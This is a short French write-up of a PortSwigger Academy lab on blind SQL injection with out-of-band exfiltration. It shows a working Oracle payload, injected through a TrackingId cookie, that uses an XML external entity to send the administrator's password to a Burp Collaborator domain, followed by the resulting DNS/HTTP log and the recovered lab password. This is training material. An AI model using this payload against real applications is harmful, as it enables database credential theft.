# Lab

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

## Solution

On reprend le payload du lab `Blind SQL injection with out-of-band interaction` pour concat un `SELECT` sur le password de l'username `administrator`:

```html
Cookie: TrackingId=c'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+LIMIT+1)||'.rzus2t0mmqdbbt7h3dxvinhs2j8bw9ky.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

En clair, le payload est :

```sql
c' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users LIMIT 1)||'.rzus2t0mmqdbbt7h3dxvinhs2j8bw9ky.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

Ce qui nous donne dans Burp Collaborator :

```html
GET / HTTP/1.0
Host: yh5pblds733yhjktqiqm.rzus2t0mmqdbbt7h3dxvinhs2j8bw9ky.oastify.com
Content-Type: text/plain; charset=utf-8
```

Donc le password de l'admin est `yh5pblds733yhjktqiqm`.